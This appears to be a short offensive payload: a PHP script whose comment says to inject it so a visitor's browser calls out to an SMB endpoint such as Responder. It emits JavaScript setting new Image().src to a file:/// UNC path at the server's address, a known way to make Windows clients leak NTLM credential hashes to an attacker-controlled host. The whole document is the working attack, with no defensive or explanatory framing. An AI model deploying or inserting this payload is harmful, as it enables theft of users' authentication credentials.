<?php
  /**
  * Inject this in order to have the browser call out to an SMB endpoint, e.g. Responder
  */
  $url = "file:///\\".$_SERVER["SERVER_ADDR"];
  echo "// $url\n";
?>
new Image().src="<?php echo $url; ?>";
